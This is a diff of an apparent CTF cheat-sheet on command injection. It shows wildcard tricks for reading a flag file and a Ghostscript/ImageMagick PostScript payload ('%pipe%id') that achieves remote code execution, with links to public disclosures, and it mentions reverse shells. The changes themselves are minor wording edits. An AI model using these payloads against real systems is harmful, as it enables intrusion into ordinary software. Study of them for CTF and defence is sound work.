@@ -1,5 +1,6 @@
 # Command injection
 In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
+First, we can take a look at the power of wildcard...  
 ```php
 // match one character
 cat fla?
@@ -25,7 +26,7 @@ legal
 restore
 mark /OutputFile (%pipe%id) currentdevice putdeviceprops
 ```  
-Attention ❗️: The timing to trigger the RCE is important.  
+❗️ Attention: The timing to trigger the RCE is important.  
 [ref: mail of Tavis](http://openwall.com/lists/oss-security/2018/08/21/2)  
 [ref: security team of imageMagick](https://imagetragick.com/)  
 [ref: PostScript语言安全研究](https://paper.seebug.org/68/#0x03-ghostscriptimagemagick)  
